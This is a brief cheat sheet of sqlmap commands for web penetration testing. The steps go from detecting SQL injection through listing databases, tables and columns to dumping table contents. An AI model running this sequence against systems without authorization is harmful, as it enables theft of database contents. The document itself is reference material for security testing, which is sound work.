# SQLMap Cheat Sheet

This document contains commonly used SQLMap commands during Web Application Penetration Testing.

---

## 1. Detect SQL Injection

```bash
sqlmap -u "<URL>" --batch
```
#->Url must have the injected parameter

Purpose:
- Detect SQL Injection
- Identify vulnerable parameter
- Fingerprint the backend DBMS

---

## 2. List Databases

```bash
sqlmap -u "<URL>" --dbs --batch
```

Purpose:
- Enumerate available databases.

---

## 3. List Tables

```bash
sqlmap -u "<URL>" -D <database_name> --tables --batch
```

Purpose:
- Enumerate tables.

---

## 4. List Columns

```bash
sqlmap -u "<URL>" -D <database_name> -T <table_name> --columns --batch
```

Purpose:
- Enumerate columns.

---

## 5. Dump Table Data

```bash
sqlmap -u "<URL>" -D <database_name> -T <table_name> --dump --batch
```

Purpose:
- Extract data from a table.

---

## 6. Identify Database Banner

```bash
sqlmap -u "<URL>" --banner --batch
```

Purpose:
- Retrieve DBMS version.

---

## Typical SQLMap Workflow

Find Injection Point
        ↓
Identify DBMS
        ↓
Enumerate Databases
        ↓
Enumerate Tables
        ↓
Enumerate Columns
        ↓
Dump Data
